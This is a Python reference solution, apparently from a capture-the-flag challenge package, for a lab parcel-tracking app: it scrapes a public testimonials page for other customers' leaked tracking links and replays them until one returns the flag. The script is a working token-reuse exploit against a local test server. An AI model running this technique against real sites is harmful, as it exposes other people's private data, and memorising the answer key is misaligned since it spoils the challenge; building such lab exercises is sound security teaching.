#!/usr/bin/env python3
"""Reference exploit for auth3 (QuickShip Tracker).

The tester's own tracking sid (handed out on the landing page) never shows a
flag -- it belongs to a non-VIP parcel. A VIP customer's full tracking link
was pasted into the public /stories testimonial page; following it reaches
their parcel, which does carry the flag.
"""
import os
import re
import sys
import time

import requests  # pip install requests

BASE = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("BASE", "http://127.0.0.1:8062")


def wait_up(s: requests.Session) -> None:
    for _ in range(30):
        try:
            s.get(BASE, timeout=2)
            return
        except requests.RequestException:
            time.sleep(1)


def main() -> int:
    s = requests.Session()
    wait_up(s)

    landing = s.get(BASE, timeout=5).text
    m = re.search(r"/track\?sid=([0-9a-f]+)", landing)
    if not m:
        sys.stderr.write("could not find the tester's own tracking link\n")
        return 1
    own_sid = m.group(1)

    # Pre-exploit: the tester's own tracking link must NOT return the flag.
    r = s.get(f"{BASE}/track", params={"sid": own_sid}, timeout=5)
    if "flag{" in r.text:
        sys.stderr.write("precondition failed: own sid already shows the flag\n")
        return 1

    stories = s.get(f"{BASE}/stories", timeout=5).text
    leaked = [sid for sid in re.findall(r"/track\?sid=([0-9a-f]+)", stories) if sid != own_sid]
    if not leaked:
        sys.stderr.write("no leaked sid found on /stories\n")
        return 1

    for sid in leaked:
        r = s.get(f"{BASE}/track", params={"sid": sid}, timeout=5)
        mm = re.search(r"flag\{[^}]+\}", r.text)
        if mm:
            print(mm.group(0))
            return 0

    sys.stderr.write("no flag found\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
